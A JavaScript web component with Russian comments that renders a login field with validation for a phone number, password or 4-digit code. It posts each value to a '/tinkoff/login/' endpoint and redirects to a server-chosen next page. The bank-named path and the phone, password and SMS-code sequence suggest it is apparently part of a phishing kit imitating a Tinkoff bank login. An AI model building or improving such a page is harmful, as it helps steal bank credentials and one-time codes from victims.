class InputControl extends HTMLElement {
    constructor() {
        super();

        this.attachShadow({ mode: 'open' });

        // Получаем атрибуты `label`, `type` и `error-message`
        const label = this.getAttribute('label') || 'Введите текст';
        this.type = this.getAttribute('type') || 'text';
        this.errorMessageElement = null;

        // HTML шаблон компонента
        this.shadowRoot.innerHTML = `
            <style>
                .input-container {
                    display: flex;
                    flex-direction: column;
                    margin-bottom: 1rem;
                }
                label {
                    font-weight: bold;
                    margin-bottom: 0.5rem;
                }
                input {
                    padding: 0.5rem;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                }
                .error-message {
                    color: red;
                    font-size: 0.8rem;
                    margin-top: 0.5rem;
                    display: none;
                }
                button {
                    margin-top: 0.5rem;
                    padding: 0.5rem;
                    background-color: #007bff;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    gap: 0.3rem;
                }
                button:hover {
                    background-color: #0056b3;
                }
            </style>

            <div class="input-container">
                <label>${label}</label>
                <input type="text" />
                <span class="error-message"></span>
                <button type="button">
                    Отправить
                    <span>&#8594;</span> <!-- Стрелочка -->
                </button>
            </div>
        `;

        this.input = this.shadowRoot.querySelector('input');
        this.errorMessageElement = this.shadowRoot.querySelector('.error-message');
        this.button = this.shadowRoot.querySelector('button');

        this.button.addEventListener('click', () => this.handleSubmit());
    }

    async handleSubmit() {
        const value = this.input.value.trim();
        let [isValid, errorMessage] = this.inputIsValid(value);

        if (!isValid) {
            this.showError(errorMessage);
            return;
        }

        this.hideError();

        // Отправка данных или переход
        this.button.disabled = true;
        
        try {
            // Отправляем данные логина через POST
            const response = await fetch('/tinkoff/login/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(value)
            });

            const result = await response.json();

            if (result.status === "success" && result.next_page) {
                // Перенаправляем на универсальный GET эндпоинт
                window.location.href = result.next_page;
            } else {
                this.showError(result.message || 'Произошла ошибка.');
            }
        } catch (error) {
            this.showError('Ошибка сети. Попробуйте снова.');
            console.error('Ошибка:', error);
        } finally {
            this.button.disabled = false;
        }
    }

    showError(message) {
        this.errorMessageElement.style.display = 'block';
        this.errorMessageElement.textContent = message;
    }

    hideError() {
        this.errorMessageElement.style.display = 'none';
        this.errorMessageElement.textContent = '';
    }

    inputIsValid(value) {
        let isValid = true;
        let errorMessage = '';

        // Проверка в зависимости от типа поля
        switch (this.type) {
            case 'phone':
                const phonePattern = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[-\s]?\d{2}[-\s]?\d{2}$/;
                isValid = phonePattern.test(value);
                errorMessage = 'Введите корректный номер телефона';
                break;
            case 'password':
                isValid = value.length > 0;
                errorMessage = 'Пароль не может быть пустым';
                break;
            case 'code':
                isValid = value.length === 4 && /^\d{4}$/.test(value);
                errorMessage = 'Код должен состоять из 4 цифр';
                break;
            default:
                isValid = value.length > 0;
                errorMessage = 'Поле не может быть пустым';
        }
        return [isValid, errorMessage]
    }
}

customElements.define('input-control', InputControl);
